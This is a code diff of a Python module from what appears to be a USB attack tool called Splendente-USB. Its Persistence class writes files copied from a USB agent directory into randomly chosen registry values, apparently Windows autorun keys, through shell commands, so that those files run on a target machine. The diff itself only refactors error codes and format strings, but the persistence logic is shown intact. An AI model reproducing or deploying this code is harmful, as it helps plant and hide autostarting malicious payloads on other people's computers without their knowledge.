@@ -1,13 +1,13 @@
 # -*- coding: utf-8 -*-
 
+# https://github.com/Hnfull/Splendente-USB
+
 #---------------------------------------------------------- [Lib] -----------------------------------------------------------#
 
 import os
 import subprocess
 import shutil
 import random
-
-from core.splendente_error import ERROR_FILE_NOT_FOUND, ERROR_FILE_EMPTY, EXIT_SUCCESS
 
 #--------------------------------------------------- [Function(s)/Class] ----------------------------------------------------#
 
@@ -31,7 +31,7 @@ class Persistence:
 
     def Registry(self, agentUsbDirectory):
         if not os.listdir(agentUsbDirectory):
-            return ERROR_FILE_NOT_FOUND
+            return 1
         else:
             for files in os.listdir(agentUsbDirectory):
                 if files != "yourFile.exe":
@@ -40,22 +40,22 @@ class Persistence:
 
                         if os.path.exists(self.targetDirPath + "\\" + files) == True:   
                             if os.path.getsize(self.targetDirPath + "\\" + files) > 0:
-                                targetFile = " /d " + self.targetDirPath + "\\{0}".format(files)
-                                targetRegisterVersion = "{0}".format(random.choice(self.targetRegisterVersion))
+                                targetFile = " /d " + self.targetDirPath + "\\{}".format(files)
+                                targetRegisterVersion = "{}".format(random.choice(self.targetRegisterVersion))
 
                                 self.RegisterVersionALreadyUsed.append(targetRegisterVersion)
 
                                 for version in self.RegisterVersionALreadyUsed:
                                     if version == targetRegisterVersion:
                                         while version == targetRegisterVersion:
-                                            targetRegisterVersion = "{0}".format(random.choice(self.targetRegisterVersion))
+                                            targetRegisterVersion = "{}".format(random.choice(self.targetRegisterVersion))
                                             if version != targetRegisterVersion:
                                                 break
 
                                 subprocess.run(self.targetRegisterPath + targetRegisterVersion + \
                                     self.targetRegisterType + targetFile, shell=True, timeout=3)
                             else:
-                                return ERROR_FILE_EMPTY
+                                return 1
                         else:
-                            return ERROR_FILE_NOT_FOUND               
-            return EXIT_SUCCESS
+                            return 1               
+            return 0
